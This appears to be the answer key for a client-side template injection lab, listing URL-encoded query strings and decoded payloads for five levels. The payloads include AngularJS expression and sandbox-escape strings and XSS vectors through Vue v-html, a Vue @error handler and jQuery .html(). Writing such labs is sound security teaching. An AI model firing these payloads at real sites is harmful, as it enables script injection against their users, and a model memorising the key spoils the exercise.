# csti — solutions

Client-side template injection via AngularJS / Vue / jQuery sinks.

### csti-level1

`/csti/level1/?query=%7B%7Bconstructor.constructor(%27alert(1)%27)()%7D%7D`

- payload: `{{constructor.constructor('alert(1)')()}}`
- context: AngularJS 1.8 ng-app expression — sandbox removed, function constructor pop

### csti-level2

`/csti/level2/?query=%7B%7Bx=%7B%27y%27:%27%27.constructor.prototype%7D;x[%27y%27].charAt=%5B%5D.join;$eval(%27x=alert(1)%27);%7D%7D`

- payload: `{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}`
- context: AngularJS 1.6 sandbox escape via prototype chain

### csti-level3

`/csti/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: reflected into Vue data then rendered via v-html (raw HTML)

### csti-level4

`/csti/level4/?query=%3Cimg%20src=x%20%40error=%22alert(1)%22%3E`

- payload: `<img src=x @error="alert(1)">`
- context: Vue compiles #app innerHTML as template; @error is v-on:error

### csti-level5

`/csti/level5/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: jQuery .html() parses HTML and runs handlers on insertion
